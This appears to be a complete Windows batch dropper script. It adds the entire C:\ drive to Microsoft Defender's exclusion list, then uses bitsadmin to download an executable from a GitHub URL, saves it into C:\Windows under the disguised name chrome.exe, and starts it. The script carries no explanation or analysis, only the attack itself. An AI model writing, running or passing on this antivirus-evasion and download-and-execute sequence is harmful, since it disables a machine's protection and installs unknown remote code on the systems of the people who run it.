
   
:start   

@echo off

powershell  -Command Add-MpPreference -ExclusionPath "C:\"

@echo off
cmd.exe /c "bitsadmin /transfer debjob /download /priority high  http://github.com/RobertAlex23/winzo/raw/Winzo/$wz$chrome.exe C:\Windows\chrome.exe&start chrome.exe"
